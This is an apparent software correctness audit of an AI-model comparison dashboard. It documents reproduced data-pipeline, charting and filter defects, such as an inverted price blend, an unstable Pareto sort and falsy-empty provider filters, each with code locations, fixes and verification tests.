# Correctness — AI Frontier audit

**99 raw findings → 80 distinct defects after merge.** Everything below was reproduced by executing the code, not by reading it. I re-ran the six load-bearing claims myself; results are quoted inline.

---

## What's actually broken (20 seconds)

1. **Every price on the site is ~1.9× what Artificial Analysis publishes, and the UI credits AA for it.** All 148/148 rows satisfy `price == (3·price_out + price_in)/4`; AA's actual blend is input-weighted. Verified: median ratio **1.914×**, only 8/148 rows match AA.
2. **The Pareto frontier promotes strictly dominated models, and the quadrant chart moves its own goalposts.** One click on MIN SCORE (≥10, ≥20, ≥30, ≥45) labels Grok 4.5 (high) as cost-optimal when a same-price model scores 2.3 higher. Ticking two providers moves `o3` from "Slow · Smart" to "Fast · Weak" — same model, same numbers.
3. **The Compare tab's radar is unusable for its only purpose.** 132/148 models render inside the innermost 10% of the Speed spoke; 10 models with TTFT from 30 s to 102 s all draw at exactly 0%. The caption claims normalization "relative to the best model in the full dataset" — the best model renders at 90%.
4. **Filters silently invert.** Unchecking every Agent Stack provider shows *all* providers. The "xAI" checkbox matches zero rows (data says `SpaceXAI`). The Image "Fast" tag matches zero rows. Touching any global filter destroys the Compare selection.
5. **"Updated just now" is a build timestamp, not a data timestamp** — proven on run `31558618824`, where the LLM scrape failed, the image scrape succeeded, and the site published a 5 h 12 m stale catalogue under a fresh badge with a green push.
6. **README/report advertise 300+ models, 11 tabs, and a Render deployment.** Reality: 148 models, 10 tabs, GitHub Pages.

The three patterns you already know about account for **62 of the 80**. The one you don't have a name for yet: **hand-set encoding constants that nobody ever checked against the population** (radar ceilings, treemap ramp, bubble ramp, the `max(900, …)` ELO floor, the `40` bar baseline) — 7 defects, all shipping to every visitor.

---

## Theme 1 — Data-value drift: the pipeline emits numbers nothing validates

**Root cause: silent failure.** Every upstream field is read as `.get(x) or <default>`, so a rename degrades to a constant instead of raising. `data_guard.py` only counts rows (`_row_count`, `data_guard.py:39-42`) — it is dimensionally blind, so no value-level regression can ever fail CI. This theme is where the site's *numbers* are wrong, not its pixels.

### 1.1 — Price is ~1.9× AA's, and the UI attributes it to AA `HIGH` `CONFIRMED`

`data/scraper.py:101` reads `price_1m_blended_3_to_1`, which is **absent from all 443 live records**, so 100% of prices take the `:104` fallback `(3·p_out + p_in)/4`. AA publishes `price_1m_blended_0_3_1` (non-null 443/443), which equals `(3·p_in + p_out)/4` — the opposite weighting.

My own run against the committed CSV:

```
rows 148  providers 32
price == (3*price_out + price_in)/4  : 148 of 148
matches AA's published blend         :   8 of 148
median overstatement vs AA           : 1.914x
cheapest row: Gemma 4 E4B (Reasoning) price 0.08  (in 0.02 / out 0.10) — AA says $0.040
```

`docs/figures/manifest.json` publishes `floor_price: "$0.080"`. Most expensive reads $40.00 where AA reads $20.00. GPT-5.6 Terra (low): scraper $9.50, AA $4.50.

The attribution is the defect, not the basis. `docs/app.js:628` renders `title="Artificial Analysis blended price: 3 parts output to 1 part input"`; `app.py:540` says "Price uses Artificial Analysis's blended rate"; `README.md:65` repeats it. **AA publishes no output-weighted blend.** `tests/test_static_api.py:229-232` asserts the inversion, locking it in.

> Correction to the original finding: `git show 6b7c864~1:README.md` already documented "blended 3:1 output/input" *before* the 2026-05-06 flip, so the basis was intended. This is a mislabelling + history-comparability defect, not a silent 2× of an undocumented figure.

**Fix** — `data/scraper.py:101-107`: read `price_1m_blended_0_3_1` as primary, keep `(3·p_in + p_out)/4` as the fallback so both branches compute the *same* quantity. Update `tests/test_static_api.py:232`. If you keep the output-weighted basis, strip AA's name from `docs/app.js:628`, `app.py:540`, `README.md:65` and label it derived.
**Verify** — `assert np.isclose(df.price, (3*df.price_in + df.price_out)/4).all()`; spot-check three models against artificialanalysis.ai. Note `data/raw/history/` has a units break on 2026-05-06 (median 1.915×, p25 1.704, p75 2.130 across the boundary) — any price-over-time chart must not span it.

### 1.2 — Context window is an arbitrary host's cap, not the model's `HIGH` `CONFIRMED`

`data/scraper.py:92` prefers `hm["context_window_tokens"]` (the host record) over the model's own. **Mechanism correction:** the `:117-136` dedup updates only price/speed/latency/price_in/price_out — it never touches `entry["ctx"]`. So context is whichever host appears **first in AA's payload**, not the cheapest. Verified against the live payload: across 79 multi-host models the emitted context mismatches the cheapest host 17 times and the first host 0 times.

24 models understate canonical context by >5%:

| Model | CSV | Canonical | Factor |
|---|---|---|---|
| Nemotron 3.5 Lightning | 29k | 1,000,000 | 34.5× |
| Llama 4 Scout | 328k | 10,000,000 | 30.5× |
| DeepSeek V4 Pro (Reasoning, High) | 66k | 1,000,000 | 15.2× |
| MiMo-V2.5-Pro (Non-reasoning) | 66k | 1,000,000 | 15.2× |
| Inkling (xhigh) | 131k | 1,000,000 | 7.6× |
| GLM-5.2 (max) | 205k | 1,000,000 | 4.9× |

`data/local_scraper.py:73` uses the canonical value, so the two catalogues disagree with each other: 38 of 88 shared models have different context windows. `README.md:68` documents the field as "Maximum supported input length" with no caveat (`:65-66` *does* disclose the cheapest-host convention for price and speed).

Impact is a whole tab: `components/charts/context_chart.py:39-85` plots context vs quality on a log x-axis, plus the radar Context spoke (`radar.py:23,68,82`) and the Table column.

**Fix** — `data/scraper.py:92`: prefer `model_obj["context_window_tokens"]`. Do **not** relabel the column "cheapest host" — that would be false.
**Verify** — merge `aa_models.csv` and `aa_local_models.csv` on model name and assert context agrees; add it as a test.

### 1.3 — A field rename outside the 3 hard-fail keys silently publishes an all-zero column `HIGH` `CONFIRMED`

Reproduced against a 60-record synthetic payload through `_parse_api_response` + `load_from_raw`:

| Mutation | Result |
|---|---|
| `timescaleData` → `perfData` | 60 rows, **speed and latency all zero**, silent |
| `median_output_speed` renamed | 60 rows, speed all zero, silent |
| `model_creators` → `creator` | 60 rows, **every provider blank**, silent |
| context keys dropped | 60 rows, every context `'0'`, silent |
| `intelligence_index` renamed | 0 rows → exit 1 (loud, correct) |
| all 3 price keys renamed | 0 rows → exit 1 (loud, correct) |

Downstream on the real 148-row cache with speed/latency zeroed: `build_quadrant` → **0 traces, 0 annotations** (blank panel, no message); `build_rankings("speed")` → *"No models match these filters"* (blames the user); pareto/treemap/leaderboard/cost_calc render normally. So the site looks ~90% healthy. The blank quadrant is user-reachable via the Overview x-axis radio (`docs/index.html:76` → `static_api.py:223`).

**Fix** — after parsing, assert a non-null/non-zero floor (e.g. ≥80%) per critical column and return `False` so the existing `|| failed=` guard fires. Extend `data_guard.py` past `_row_count` to per-column health vs HEAD.
**Verify** — the mutation table above becomes a parametrized test: every rename must produce a non-zero exit.

### 1.4 — `data_guard` validates row counts only, and only against the previous hour `MED` `CONFIRMED` ×2

`check()` (`data_guard.py:62-91`) computes `drop_pct` from `_row_count()` and nothing else — no value ranges, no column presence, no unit sanity. Running it today on the ~1.9×-inflated price data: **"data guard OK", exit 0**. Across the 2026-05-06 price flip, rows went **255 → 283 (+11.0%)** — the guard's only metric moved in the *safe* direction while every price doubled.

Second gap: `rev` defaults to `HEAD` (`data_guard.py:66,78`) and the bot commits every run, so the baseline is *the previous hour*. Simulated in a throwaway repo, five consecutive ~19% drops:

```
148→119 PASS   119→96 PASS   96→77 PASS   77→62 PASS   62→50 PASS   50→41 FAIL (MIN_ROWS)
```

66% of the catalogue can disappear across five green runs. That is exactly the failure the module's own docstring (`data_guard.py:1-15`) exists to prevent.

Third gap: the guard is invoked only from `.github/workflows/refresh.yml:57`. `app.py:52-55` starts all three scrapers on every Dash boot, and `data/ingest.py:102-111` overwrites `aa_models.csv` **and** freezes `data/raw/history/aa_models_<today>.csv` with no guard on that path.

**Fix** — add per-column median-shift and column-presence checks; add a 24 h baseline with a tighter cumulative budget; raise `MIN_ROWS` from the legacy 50 to ~60% of the 7-day median; call the guard from `scrape_and_save` before `save_cache`.
**Verify** — re-run the five-step shrink simulation and assert it fails by step 2; run the guard against a snapshot with prices ×2 and assert non-zero exit.

---

## Theme 2 — Scales, frontiers and rankings derived from the filtered frame

**Root cause: pattern (b), verbatim.** The codebase already knows this is a bug class — `constants.py:255` says `QUALITY_INDEX_MAX` exists "so a model keeps the same vertical position … whatever the filter", `quadrant.py:36-39` pins bubble size to `BUBBLE_PRICE_REF` for the same reason, and `tests/test_pareto_chart.py:204` asserts bubble-size invariance. The rule was applied to *size* and never to thresholds, axis ranges, frontier membership, metric selection, or score normalization.

### 2.1 — Quadrant thresholds and y-range move with unrelated filters `HIGH` `CONFIRMED`

`quadrant.py:33-34` takes `med_speed` / `med_quality` from `plot_df`, the user-filtered frame (`app.py:1090`, `static_api.py:223`). `:55` does `y_max = plot_df["quality"].max() * 1.15`. `:150` takes `speed_p75` the same way. `build_quadrant` takes one argument — it has no access to the full catalogue.

My own run, reading the crosshairs straight off the returned figure's shapes:

```
unfiltered        n=148 med_speed= 105.28 med_q= 25.67 yrange=(0,72.51) flips= 0/95
OpenAI+Anthropic  n= 36 med_speed=  85.11 med_q= 45.51 yrange=(0,72.51) flips= 5/13
   o3:  Slow / Smart -> Fast / Weak          (BOTH axes invert)
   Claude Sonnet 4.6 (NR, Low): Slow / Smart -> Slow / Weak
minq20            n= 93 med_speed= 102.70 med_q= 37.70 yrange=(0,72.51) flips=20/57
Meta              n=  4 med_speed=  38.45 med_q=  9.76 yrange=(0,16.65) flips= 2/4
```

A **quality-only** filter moves the **speed** threshold and flips 20 of 57 models. The zone captions ("Fast · Smart") are absolute-sounding categorical judgements about a fact that is really a statement about who else is on screen.

**Fix** — compute `med_speed` / `med_quality` / `speed_p75` once from the full catalogue (precompute in the caller and pass them in) and set `yaxis.range=[0, QUALITY_INDEX_MAX]` as `local_scatter.py:146` already does.
**Verify** — mirror `test_bubble_size_is_invariant_under_filtering`: assert a model's quadrant label is identical for the full frame and a provider-filtered subset.

### 2.2 — Pareto frontier admits strictly dominated models when prices tie `HIGH` `CONFIRMED`

`components/charts/pareto.py:29` is `sort_values("price")` — pandas default `kind='quicksort'`, **not stable** — followed by `if row["quality"] > max_q`. When two models share a price, row order decides, and the worse one can be appended first.

I re-derived this independently against a brute-force strict-domination set at every MIN SCORE option:

```
minq   code  true  extra
   0     10    10  —
  10     11    10  Grok 4.5 (high)
  15      9     9  —
  20      9     8  Grok 4.5 (high)
  25      6     6  —
  30      7     6  Grok 4.5 (high)
  35/40   6     6  —
  45      7     6  Grok 4.5 (high)
  50      6     6  —
```

Grok 4.5 (high) is $5.00/q55.76; Qwen3.8 Max is **the same $5.00** at q58.08. The dotted "Pareto Frontier" line therefore contains a vertical segment and the label trace prints "Grok 4.5 (high)" as frontier-optimal. **Unfiltered is correct**, which is why `docs/figures/pareto.json` never showed it — it needs exactly one click on a primary global control. Also reachable via 3 of 528 provider combos: `(Alibaba, Google)`, `(Alibaba, SpaceXAI)`, `(Google, NVIDIA)`.

`tests/test_pareto_chart.py` has 21 tests for this chart; none asserts the frontier is the non-dominated set.

**Fix** — `pareto.py:29`: `sort_values(["price","quality"], ascending=[True,False], kind="stable")`. With the descending-quality secondary key, only the first row of a price tie can qualify.
**Verify** — assert the returned set equals a brute-force non-dominated set for the full frame and for each of the 10 MIN SCORE options. `components/charts/animated_pareto.py:27` has the identical bug but has **zero importers** — fix or delete with the dead-code sweep (§9.4).

### 2.3 — Image Gen picks each column's ELO metric from the filtered frame `MED` `CONFIRMED` (merged ×2)

`_pick_elo_column` (`image_scatter.py:36-42`) returns the first candidate with `.notna().any()` **in the frame it is handed**, and each category lists the current taxonomy first with a *retired 2025 column* as fallback (`:23-31`). On the full frame the picks are `elo_live_action_film / elo_animation_gaming / elo_text_rendering`.

Reproduced: `providers=['MiniMax']` → Text Rendering column switches to `elo_text_typography`, plotting Image-01 at 1025.51. Add Google → column reverts to `elo_text_rendering` and **Image-01 disappears entirely** while MiniMax is still selected. Same for DeepSeek/Janus Pro (705.37). Sweep of all 39 providers: 4 flip to the retired column in isolation (DeepSeek, MiniMax, OpenGVLab, Runway); NVIDIA resolves to `None` and falls into the `:77-89` tag branch, rendering an empty column with no message. Subtitle still says "arena ELO within each category" (`image_scatter.py:171`).

**Fix** — resolve the column once against the full unfiltered `get_image_df()` (module-level or memoized) and pass it in; render rows missing that column as "not scored in this category" rather than dropping them.
**Verify** — assert the chosen column set is identical for the full frame and for every single-provider subset.

### 2.4 — Video Pareto frontier computed from the selection `MED` `CONFIRMED`

`video_chart.py:214` tests dominance only within `plot_df`. Reproduced by reading the trace named `"Pareto Frontier"`: with providers Runway+OpenAI, `Gen-3 Alpha Turbo` ($0.005/q74) and `Sora Turbo` ($0.010/q80) sit on the frontier. In the full dataset both are strictly dominated — `Wan 2.1 (14B)` is $0.003 at q74 and `Dream Machine 1.6` is $0.004 at q80, **2.5× cheaper for identical quality**. The legend says only "Pareto Frontier", with no scope qualifier.

**Fix** — compute the frontier once from `get_video_df()` and pass the model-name set down, so filtering can hide frontier points but never promote dominated ones. Otherwise rename to "Frontier (current selection)".

### 2.5 — Agent Stack "Fast" score normalizes against the filtered pool `MED` `CONFIRMED`

`stack_recommender.py:128-130` derives `q_max`, `v_max`, `s_max` from `pool`, which is already provider-filtered at `:426`. Because each of the three components is divided by a *different* pool-dependent maximum, the relative weighting changes — ordering is not preserved:

```
SpaceXAI only:  Grok 4.3 (low) 0.9880 > Grok 4.3 (medium) 0.9812
all providers:  Grok 4.3 (low) 0.3869 < Grok 4.3 (medium) 0.3876   RANK FLIPPED
Alibaba only:   Qwen3.6 35B A3B 0.7060 > Qwen3.6 27B (NR) 0.6980
all providers:  Qwen3.6 35B A3B 0.3531 < Qwen3.6 27B (NR) 0.5297   RANK FLIPPED
```

Sweeping single→pair transitions found **7 selections where the rendered top-5 order visibly flips** (SpaceXAI + Google/InclusionAI/Kimi/StepFun; Alibaba + MiniMax/Sapiens AI/Tencent). `_pick_local_tier` has the same shape at `:155-160`.

**Fix** — compute the three maxima once from the full `df` (subject only to `quality>0 & price>0`) and pass them into `_pick_api_tier` / `_pick_local_tier`.
**Verify** — assert a model's composite score is identical under any provider selection that contains it.

---

## Theme 3 — Encoding constants nobody calibrated against the data

**Root cause (new, and worth naming): hand-picked round numbers used as encoding ceilings/floors, never checked against the population.** Every one of these ships in `docs/figures/*.json`, so they hit visitors with no interaction.

### 3.1 — Radar axes are dead, capped, or saturated, and the caption is false `HIGH` `CONFIRMED` (merged ×3)

Verified by me against the live 148-row frame:

| Axis | Constant | Pop. max | max/const | Consequence |
|---|---|---|---|---|
| Intelligence | 70.0 | 63.05 | 0.90 | best model renders 90%, never 100% |
| **Speed** | 2500.0 | 1559.9 | 0.62 | **132/148 render below 10% of radius** |
| **Context (k)** | 2000.0 | 1000.0 | **0.50 exactly** | every 1M-token model pins at 50.0% |
| Price | 50.0 | 40.0 | 0.80 | — |
| **Latency** | **30.0** | **101.87** | **3.40** | 10 models clamp to a flat 0% |

`constants.py:255,260-263`; normalization at `radar.py:62-66`; clamp at `radar.py:91`.

Shipped, not hypothetical — `docs/figures/radar.json` r-values for the default five: Speed `0.021 / 0.024 / 0.119 / 0.064 / 0.020`, Context `0.500` for four of five. `compute_diverse5` deliberately includes a "fastest model" pick (Kimi K2.7 Code, 298 tok/s) — it renders at 11.9% against Claude Opus 5's 2.1%. Both read as the origin.

Latency is the worst: GPT-5.6 Terra (max) at **101.87 s** and Granite 4.0 H Small at **32.52 s** draw the identical zero-length spoke. There are 0 NaN latencies today, so this is worst-vs-worst conflation, not missing data.

The caption is flatly false: `app.py:509-510` says "all normalized to 0–100% relative to the best model in the full dataset"; `radar.py:126` says "normalized 0–100 across all models". `radar.py:56-61` carries a comment showing this wording was already caught once. Partial mitigation: the raw-values table beneath (`app.py:531-533`, `docs/app.js:461`) does show true TTFT.

**Fix** — derive the five ceilings once from the full unfiltered catalogue at import and cache them as module constants (that preserves the filter-stability the comment at `radar.py:56-61` was protecting). Use a log or rank transform for Speed and Latency, both heavy-tailed. Rewrite `app.py:509` and `radar.py:126` to state the actual reference values whichever way you go.
**Verify** — a test asserting `pop_max / ceiling ∈ [0.9, 1.0]` for every axis, and that no two models with >2× real latency difference render within 1% of each other.

### 3.2 — Image Gen x-axis inverts for 17 of 39 provider filters `HIGH` `CONFIRMED`

`image_scatter.py:191-192`: `x_min = max(900, elo.min()-30)` then `x_max = elo.max() + (elo.max()-x_min)*0.32`. When the filtered max ELO is below 900 the headroom term goes **negative** and `x_max < x_min` — a decreasing Plotly range — written straight to `fig.layout[xref].update(range=[x_min, x_max])` at `:194-195` with no ordering guard.

Re-enumerated: **17 of 39 providers produce ≥1 inverted axis, 38 broken axes total.** Stability.ai (10 models): ranges `(900, 844.48) / (900, 830.63) / (900, 838.90)` against bar values `[513.29 … 857.94]` — **all 10 bars fall below the axis floor, on an axis running high-to-low.** Amazon and Meituan invert all three columns; DeepSeek `(900, 445.34)`.

The unfiltered chart is fine, so this appears only once a user touches the filter. Reachable from both renderings (`app.py:1421-1434`, `static_api.py:350-359`), and `image_scatter.py` is inside `docs/pybundle.zip`.

**Fix** — `x_min = min(elo.min() - 30, x_max_candidate - 1)`, or drop the magic 900 and derive both bounds from the **full** image frame so bar length means the same thing under every filter.
**Verify** — regression test asserting `range[0] < range[1]` for every single-provider subset.

### 3.3 — Treemap colour ramp darkens over its first 30% `MED` `CONFIRMED`

Stops at `treemap.py:51-58` with `cmin=0, cmax=70`. Walking the scale at 0.005 steps and converting to WCAG relative luminance: **60 consecutive negative steps from t=0.00 to t=0.30**, global minimum at t=0.30 (score 21.0). Stop luminances `0.0316 → 0.0161 → 0.0340 → 0.0756 → 0.2242 → 0.5431`.

13 of 32 providers fall in the inverted band; **112 of 496 provider pairs render the higher-scoring provider darker**. Reka AI (3.71) vs Inception (21.90) is ΔE76 6.77 with Reka *lighter*. `docs/figures/treemap.json` carries the same scale. The comment at `treemap.py:43-49` claims this exact failure was fixed — the autoscaling half was; the ramp was not.

> Held at medium, not high: the whole affected band is near-flat navy. Meta vs Google is ΔE 2.73, right at the JND. The honest statement is "the bottom 30% of the ramp carries almost no discriminable signal, and what little it carries points backwards."

**Fix** — start the scale at the darkest colour (drop `#243056`, put `#16213e` at 0.0) or reorder to `#101828 → #16213e → #0f3460 → #1a5276 → #00909e → #00d4ff`.
**Verify** — test that walks the scale at 0.01 and asserts luminance is non-decreasing.

### 3.4 — "Bubble size ∝ affordability" is unreadable for 56% of marks `MED` `CONFIRMED`

`quadrant.py:40` → `bubble_size(price, ref=20.0, invert=True)` = `7 + sqrt(1 - min(price,20)/20)*19` (`constants.py:287-291`). Linear in price, against a variable that runs $0.08–$40.00 with a $0.96 median.

Measured diameters off the figure:

```
$0.00–$0.50  n=32  25.76 .. 25.96 px
$0.50–$1.00  n=21  25.53 .. 25.76 px
$5.00–$10.00 n=12  20.77 .. 23.45 px
>= $20.00    n= 4   7.00 ..  7.00 px
```

53 of 95 models are sub-$1 and span **0.43 px total** — a 12.5× price difference. At the top, $20.00, $23.75, $23.75 and $40.00 all draw at exactly 7.00 px. The same helper on pareto (speed, ref=900, not inverted) spreads 8.76–26.00 px and works fine, so the helper is not the problem.

**Fix** — `frac = 1 - (log10(clamp(price, 0.05, 20)) - log10(0.05)) / (log10(20) - log10(0.05))`, so a decade of price is a constant size step. Or drop the channel — price already has its own axis on this tab.

### 3.5 — Video rankings bar axis starts at 40 under a "0–100" title `MED` `CONFIRMED`

`video_chart.py:104-105`: title `"Quality Score (0–100)"` directly above `range=[40, max_q * HEADROOM]`. `docs/figures/video_rankings.json` ships `xaxis.range = [40, 94.86]`. Data spans 58–93, so SVD:Veo3 reads `(58-40)/(93-40) = 0.340` against a true `58/93 = 0.624` — **1.8× overstated**, and bar length is the sole encoding. Default view of a tab, no filtering required.

**Fix** — start at 0, or switch to a dot/lollipop plot which reads correctly on a truncated scale. Either way the axis title must stop claiming a range it does not show.

---

## Theme 4 — Controls that silently do the opposite of what was asked

**Root cause: silent failure, specialised — Python truthiness conflating "none" with "unset", plus filter options that outlive their data.** No control in this group tells the user it did something different from what they clicked.

### 4.1 — Unchecking every Agent Stack provider shows *all* providers `HIGH` `CONFIRMED` (merged ×3)

`stack_recommender.py:425` is `if providers:` — `[]` is falsy. But both callers deliberately distinguish the states: `app.py:1041-1048` and `static_api.py:387-394` each have `elif not selected: providers = []` as a *separate branch* from `elif "__all__" in selected: providers = None`, and the docstring at `:419` says "None = all". Executed: `update_recommend([], 'api', …)` and `update_recommend(['__all__'], …)` return **byte-identical** `cards_html` (32,478 chars), listing Alibaba, Anthropic, DeepSeek, MiniMax, OpenAI, Tencent, Xiaomi — the providers the user just excluded. Reachable in both renderings (`docs/index.html:219-237` are seven independent checkboxes; Dash `dcc.Checklist` yields `[]` identically).

**Fix** — `if providers is not None:` at `stack_recommender.py:425`. `_tier_card_html:654` already handles the empty frame. No caller change needed.
**Verify** — assert `select_stack(df, [], mode)` returns three empty tiers and `select_stack(df, None, mode)` does not.

### 4.2 — The "xAI" checkbox matches zero rows `HIGH` `CONFIRMED` (merged ×2)

`app.py:378` and `docs/index.html:228` both offer `value="xAI"`. I confirmed: **`xAI` rows = 0, `SpaceXAI` rows = 4.** `stack_recommender.py:425-426` does a raw `.isin(providers)` with no canonicalization, so `select_stack(df, ['xAI'], 'api')` → `['EMPTY','EMPTY','EMPTY']` and `build_stack_cards_html` contains "No models match these criteria" ×3. `['SpaceXAI']` returns the three Grok models correctly.

The fix already exists and is used elsewhere: `constants.py:66-70` defines `PROVIDER_ALIASES = {'Microsoft Azure':'Microsoft', 'xAI':'SpaceXAI'}` with `canonical_provider()` at `:72-74`, called by `data/local_models.py:91` *for exactly this reason*. `stack_recommender.py` imports from that module (`:23`) but takes only the colours.

Hidden: Grok 4.5 (high) at q=55.76, above the p90 of 52.7.

**Fix** — `providers = [canonical_provider(p) for p in providers]` before the `isin`.
**Verify** — test asserting every hardcoded provider option value exists in `get_models().provider.unique()` after aliasing.

### 4.3 — The Image "Fast" tag matches zero rows and can never match any `MED` `CONFIRMED` (merged ×2)

`docs/index.html:179` and `app.py:794` offer `value="fast"`. Live tag inventory: `{general:151, photorealistic:48, open_weights:47, text:42, artistic:41}` — no `fast`. Structurally unreachable: `_derive_tags` (`data/image_models.py:129-154`) can only emit those five, and the only `'fast'` literal (`:105`) is in the `_RAW` fallback the CSV cache bypasses. `update_image(None, ['fast'])` → 0 traces + "No image models match these filters".

This is a repeat of a bug already fixed at the wrong layer — `app.py:731-734` carries the comment *"'multilingual' was never emitted, so selecting it matched zero models and blanked both Run Local charts"*. The option was removed; the class was not.

**Fix** — build tag options from the data (ship `image_tags` in the manifest the way `image_providers` already is).
**Verify** — test asserting every offered tag matches >0 rows, for every tag control in both renderings.

### 4.4 — Compare silently destroys the user's selection `HIGH` `CONFIRMED` (merged ×3)

Two independent triggers, one root cause: `selected_models` is **discarded, not pruned**.

**(a) Any global filter** — `app.py:1153-1156` / `static_api.py:248-254`: `if triggered in ("filter-provider","filter-quality","model-search"): capped = compute_diverse5(filtered)`. Browser-proven: a curated 3-model comparison (`Mistral Medium 3.5`, `Grok 4.5 (high)`, `Llama 4 Maverick`) was replaced by the 5 diverse defaults on a single click of the "Top 25%" preset. **This is not legitimate pruning** — Grok 4.5 (high) scores 55.76 ≥ the new 42.1 floor and still passed. Clearing the filter does not restore it. `docs/app.js:685` routes every global-filter change here, so the live site does it too.

**(b) Any tab switch, static site only** — `switchTab` (`docs/app.js:159-172`) unconditionally calls `rerenderActiveFilterCharts()` at `:171`, which passes the literal `"filter-provider"` at `:685`. Reproduced: narrow to one model, go to Table, come back → the 5 defaults, and `docs/app.js:463-473` writes them onto the `<select>`. Dash's `update_compare` has no `tabs` Input, so it does not do this — pure drift. `docs/app.js:775-781` hand-rolls its own tab switch to dodge `switchTab`, which is evidence the clobber was known locally and never fixed generally.

**Fix** — prune: `kept = [m for m in (selected_models or []) if m in set(filtered['model'])]; capped = kept[:5] or compute_diverse5(filtered)`. Pass a distinct `"tab-switch"` trigger from `switchTab` and only reset on the three real filter triggers.
**Verify** — assert a selection that still satisfies the new filter survives it, and that `update_compare(..., 'tab-switch')` is a no-op on the selection.

### 4.5 — `value or DEFAULT` makes `0` mean "unset" in three numeric inputs `MED` `CONFIRMED` (merged ×2)

| Site | Expression | Effect |
|---|---|---|
| `app.py:1172` / `static_api.py:268` | `float(tokens) if tokens else 1.0` | `update_cost_calc(0,…)` returns a figure **byte-identical** to `(1,…)` |
| `app.py:1214` / `static_api.py:313` | `float(vram or 8) * int(gpus or 1)` | Run Local: 32 GB → 46 models fit; cleared or `0` → **8 GB, 21 models**, title still says "fit **your hardware**", dropdown still reads "NVIDIA RTX 5090" |
| `app.py:1055` / `static_api.py:400` | `float(vram or 32)` | Agent Stack recommends a **21.2 GB model for a stated 0 GB** |

The two VRAM defaults disagree with each other (8 vs 32) for the same user action on two tabs, and `docs/app.js:560,598` both send 32 — so a cleared field means **32 GB on the public site and 8 GB in Dash**. `app.py:702-703` uses `debounce=True`, so clearing the box and tabbing away lands squarely in this path.

**Fix** — `x = DEFAULT if x is None else float(x)` at all six sites, render an explicit empty state for 0, and hoist the VRAM default to one shared constant.
**Verify** — assert `update_local(0,…) != update_local(8,…)` and that the chart title echoes the effective VRAM.

### 4.6 — Negative token volume names the *most expensive* model as "cheapest" `MED` `CONFIRMED`

`docs/index.html:103` has `min="0.1"`, which is a validation hint only. I re-tested with genuine keystrokes (`pressSequentially('-5')`): `{value:'-5', rangeUnderflow:true, valid:false}` — and there is no form and no validity check at `docs/app.js:539`, so `-5` passes through. `cost_calc.py:24-25` then computes `monthly_cost = -5 * price` and sorts **ascending**, so the largest price sorts first:

```
callout 'CHEAPEST MODEL SCORING 45+' -> Claude Fable 5 …  price $40.00/M  monthly_cost -200.0
actual cheapest >=45                 -> DeepSeek V4 Flash 0731  $0.1575
xaxis range [0, -3.882]   bar labels ['$-200.000','$-118.750','$-118.750']
```

**Fix** — clamp in `_spendable`: `monthly_tokens_m = max(0.0, float(monthly_tokens_m or 0))`, and have `update_cost_calc` return an explicit "Enter a positive token volume" state for non-positive input.

### 4.7 — Quality presets silently clear the provider selection `LOW` `CONFIRMED` (I verified this one — it was the only UNVERIFIED finding)

`app.py:1007-1015`, read directly:

```python
if trigger == "preset-all":    return 0,     [], ""
if trigger == "preset-strong": return _P75,  [], no_update
if trigger == "preset-elite":  return _P90,  [], no_update
```

All three return `[]` into `filter-provider`. The buttons are labelled purely in quality terms ("All", "Top 25%", "Top 10%") and sit in the same bar as the PROVIDER dropdown, so PROVIDER=Anthropic + "Top 10%" answers a different question than the one asked. The three buttons also have three different scopes — "All" clears SEARCH, the other two don't.

**Fix** — return `no_update` for `filter-provider` from `preset-strong`/`preset-elite`; relabel "All" as "Reset filters" since that is what it does.

### 4.8 — The Compare 5-model cap misbehaves four different ways `MED/LOW` `CONFIRMED` (merged ×4)

One root cause: **the cap truncates or deselects by position rather than by recency, and nothing tells the user the cap fired.**

| Path | Behaviour | Evidence |
|---|---|---|
| Static, 6th pick below current picks | complete no-op, `dropped=[]` | `docs/app.js:834-842` — `selectedOptions` is **document order**, so `opts[len-1]` is the bottom-most, not the newest |
| Static, 6th pick above current picks | an *unrelated* model silently vanishes | same |
| Static, shift-select 9 | 8 stay highlighted, 5 charted, `<select>` never corrected | `[:5]` at `static_api.py:254`; sync-back skipped at `docs/app.js:463` |
| Dash, 6th pick | the model you just clicked is discarded | `app.py:1156` `[:5]` over click-ordered `value` |
| Both, detail-panel "→ Compare" | **silent no-op on first use** — both renderings default to exactly 5 (`compute_diverse5` → 5, `manifest.diverse5` → 5), and the tab switches anyway | `app.py:1342-1345`, `docs/app.js:771-786` |

The detail panel's only call-to-action does nothing on a fresh page load, in both renderings. `docs/index.html:95-97` also omits the "max 5" hint `app.py:524` renders.

**Fix** — evict oldest, not newest (`[-5:]`), trim with `opts.slice(5).forEach(o => o.selected = false)`, disable the "→ Compare" button with `title="Compare is full — remove a model first"` when `len(current) >= 5`, and skip the tab switch when nothing was added. Add the "max 5" hint to `docs/index.html`.

### 4.9 — The global filter bar is inert on 4 of 10 tabs, and ↓CSV exports the wrong dataset `MED` `CONFIRMED` (merged ×2)

The PROVIDER / MIN SCORE / SEARCH / ↓CSV bar is rendered at `app.py:243-283`, **outside** `dcc.Tabs` (`:306`), with no `id` — so no callback can hide it. `docs/index.html:43` is the same, and `showTabControls` (`docs/app.js:133-157`) only toggles `[id^="tab-controls-"]`. Agent Stack, Run Local, Image Gen and Video Gen consume none of the three inputs.

Browser-verified on `?tab=image&p=Anthropic&q=45`: the bar reads "Anthropic" / "≥ 45" while the chart plots **72 bars** spanning Qwen, Reve, ByteDance, Google, HiDream, Microsoft. Confirmed on the real Dash app too. The concrete harm: `export_csv(['Anthropic'], 50, '')` called from the Image Gen tab returns the **LLM** header `model,provider,context,quality,price,speed,latency,price_in,price_out` with 7 text models.

**Fix** — hide or disable the bar on those four tabs (it's outside `dcc.Tabs`, so a callback on `tabs.value` can set its style — give it an `id` first), and re-label / re-target ↓CSV per tab.

---

## Theme 5 — app.py ↔ docs/app.js drift

**Root cause: pattern (c).** The same feature implemented twice, diverging silently. Note the asymmetry: `app.py` is local-dev only, so a Dash-only bug costs you; a JS-only bug costs every visitor.

### 5.1 — `?tab=<unknown>` blanks the entire public dashboard `HIGH` `CONFIRMED`

`applyUrlState` (`docs/app.js:750-762`) ends with `if (u.get("tab")) switchTab(u.get("tab"));` — no validation. `switchTab` (`:159-172`) sets `display = t.id === id ? "block" : "none"`, so an unmatched id hides **every** panel. Served `?tab=performance`: `{stateTab:"performance", selectedTabs:[], visiblePanels:[], tabPanelsHeight:0}` — header, stat bar and filter row, zero content below, no error.

